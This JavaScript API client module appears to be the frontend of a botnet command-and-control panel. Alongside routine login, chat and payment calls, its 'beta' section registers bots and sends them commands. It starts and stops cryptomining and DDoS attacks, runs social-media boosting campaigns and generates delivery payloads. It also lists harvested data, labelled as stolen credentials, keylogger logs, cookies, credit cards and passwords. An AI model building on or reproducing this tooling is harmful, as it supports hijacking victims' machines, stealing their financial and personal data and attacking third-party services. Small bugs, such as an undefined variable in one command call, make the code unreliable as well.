import axios from 'axios';
import { API_ENDPOINTS, STORAGE_KEYS } from './constants';

const API_BASE_URL = 'http://localhost:8000/api';

// create axios instance
export const api = axios.create({
    baseURL: API_BASE_URL,
    headers: {
        'Content-Type': 'application/json',
    },
    timeout: 10000,
});

// request interceptor to add auth token
api.interceptors.request.use(
    (config) => {
        const token = localStorage.getItem(STORAGE_KEYS.ACCESS_TOKEN);
        if (token) {
            config.headers.Authorization = `Bearer ${token}`;
        }
        return config;
    },
    (error) => {
        console.log('api error: ', error)
        return Promise.reject(error);
    }
);

// response interceptors to handle token refresh
api.interceptors.response.use(
    (response) => response ,
    async (error) => {
        const originalRequest = error.config;

        if (error.response?.status == 400 && !originalRequest._retry) {
            originalRequest._retry = true;

            try {
                const refreshToken = localStorage.getItem(STORAGE_KEYS.REFRESH_TOKEN);

                if (refreshToken) {
                    const response = await axios.post(`${API_BASE_URL}/auth/token/refresh/`, {
                        refresh: refreshToken, 
                    });

                    const {access} = response.data;
                    localStorage.setItem(STORAGE_KEYS.ACCESS_TOKEN, access);
                    originalRequest.headers.Authorization = `Bearer ${access}`;

                    return api(originalRequest);
                }
            } catch (refreshError) {
                // refresh token failed , logout user
                localStorage.removeItem(STORAGE_KEYS.ACCESS_TOKEN);
                localStorage.removeItem(STORAGE_KEYS.REFRESH_TOKEN);
                localStorage.removeItem(STORAGE_KEYS.USER);
                window.location.href = '/login';
            }
        }

        return Promise.reject(error);
    }
);

// Auth api
export const authAPI = {
    login: (credentials) => api.post('/auth/login/', credentials),
    register: (userData) => api.post('/auth/register/', userData),
    logout: () => api.post('/auth/logout/'),
    getProfile: () => api.get('/auth/profile/'),
    updateProfile: (userData) => api.patch('/auth/profile/', userData), 
};

export const chatApi = {
    getRooms: () => api.get('/chat/rooms/'),
    createRoom: (roomData) => api.post('/chat/rooms/', roomData),
    getRoom: (roomId) => api.get(`/chat/rooms/${roomId}/`),
    getMessages: (roomId) => api.get(`/chat/rooms/${roomId}/messages/`),
    sendMessage: (roomId, content) => api.post(`/chat/rooms/${roomId}/messages/`, {content}),
    markMessageRead: (messageId) => api.post(`/chat/messages/${messageId}/read/`),
    likeMessage: (messageId) => api.post(`/chat/messages/${messageId}/like/`),

};

export const paymentsApi = {
    getDonation: () => api.get(API_ENDPOINTS.PAYMENTS.DONATIONS),
    createDonations: (donationData) => api.post(API_ENDPOINTS.PAYMENTS.DONATIONS, donationData),
    getSubscriptionPlans: () => api.get(API_ENDPOINTS.PAYMENTS.SUBSCRIPTION_PLANS),
    getSubscription: () => api.get(API_ENDPOINTS.PAYMENTS.SUBSCRIPTION),
    createCheckoutSession: (checkoutData) => api.post(API_ENDPOINTS.PAYMENTS.CHECKOUT, checkoutData),
}

export const securityApi = {
    getDemos: () => api.get(API_ENDPOINTS.SECURITY.DEMOS),
    getActivites: () => api.get(API_ENDPOINTS.SECURITY.ACTIVITIES),
    logActivity: (activityData) => api.post(API_ENDPOINTS.SECURITY.ACTIVITIES, activityData),
}

//beta app apis

export const botApi = {
    getAll: () => api.get('/beta/bots/'),
    getById: (id) => api.get(`/beta/bots/${id}/`),
    register: (botData) => api.post('/beta/bots/register/', botData),
    getStats: () => api.post('/beta/bots/stats/'),
    executeCommand: (botId, commadData) => api.post(
        `/beta/bots/${botId}/execute_command/`, commadData
    ),
    getOnline: () => api.get('/beta/bots/?status=online'),
    updateStatus: (botId, status) => api.patch(`/beta/bots/${botId}/`, {status}),
}

export const commandAPI = {
    getAll: (params = {}) => api.get('/beta/commands/', {params}),
    getById: (id) => api.get(`/beta/commands/${botId}/`),
    getPending: (botId) => api.get(`/beta/commands/pending/?bot_id=${botId}`),
    updateResult: (commandId, resultData) => api.post(`/beta/commands/${commandId}/update_status/`, resultData),
    create: (commandData) => api.post('/beta/commands/', commandData),
}   

export const dataApi = {
    getAll: (params) => api.get('/beta/data/', { params}),
    getById: (id) => api.get(`/beta/data/${id}/`),
    download: (id) => api.get(`/beta/data/${id}/download/`),
    getStats: () => api.get('/data/stats/'),
}

export const miningApi = {
    start: (miningData) => api.post('/beta/mining/start/', miningData),
    stop: (botId) => api.post('/beta/mining/stop/', {bot_id: botId}),
    getOperations: () => api.get('/beta/mining/'),
    getStats: () => api.get('/beta/mining/stats/'),
}

export const ddosApi = {
    start: (attackData) => api.post('/beta/ddos/start/', attackData),
    stop: (botId) => api.post('/beta/ddos/stop/', { bot_id: botId}),
    getAttacks: () => api.get('/beta/ddos/'),
    getStats: () => api.get('/beta/ddos/stats/')
}

export const seoApi = {
    startCampaign: (campaignData) => api.post('/beta/seo/start_campaign/' ,campaignData),
    boostTwitter: (boostData) => api.post('/beta/seo/boost_twitter/', boostData),
    getCampaignStats: (campaignName) => api.get(`/beta/seo/campaign_stats/?campaign_name=${campaignName}`),
    getCampaigns: () => api.get('/beta/seo/'),
    getStats: () => api.get('/beta/stats/'),
}

export const deliveryApi = {
    getAll: () => api.get('/beta/delivery/'),
    createWebDelivery: (campaignData) => 
        api.post('/beta/delivery/create_web_delivery/', campaignData),
    generatePayload: (campaignId, payloadType) => 
        api.get(`/beta/delivery/generate_payload/?campaign_id=${campaignId}&type=${payloadType}`),
    getStats: () => api.get('/beta/delivery/stats/'),
}

export const dashboardApi = {
    getOverview: () => api.get('/beta/dashboard/stats/'),  // dashboard overview
    getStats: () => api.get('/beta/dashboard/stats/'),  //systems stats
    getRecentActivity: () => api.get('/beta/dashboard/recent_activity'),
}

export const apiUtils = {
    //format bot platform
    formatPlatform: (platform) => {
        const platformMap = {
            'windows': 'Windows',
            'linux': 'Linux',
            'android': 'Android',
            'ios': 'iOS',
            'web' :  'Web Browser',
        }
        return platformMap[platform] || platform
    },

    formatCommandStatus: (status) => {
        const statusMap = {
            'pending': 'Pending',
            'executing': 'Executing',
            'completed': 'Completed',
            'failed': 'Failed',
            'timeout': 'Timeout'
        }
        return statusMap[status] || status
    },

    formatDataType: (dataType) => {
        const typeMap = {
            'file': 'File',
            'credentials': 'Credentials',
            'network': 'Network Info',
            'system': 'System Info',
            'browser': 'Browser Data',
            'keylogger': 'Keylogger Data',
            'cookies': 'Cookies',
            'credit_cards': 'Credit Cards',
            'passwords': 'Passwords',
        }
        return typeMap[dataType] || dataType
    },

    getStatusColor: (status) => {
        const colorMap = {
            'online': 'green',
            'offline': 'red',
            'busy': 'yellow',
            'pending': 'blue',
            'executing': 'yellow',
            'completed': 'green',
            'failed': 'red',
            'timeout': 'orange'
        }
        return colorMap[status] || 'gray'
    }
}

export default api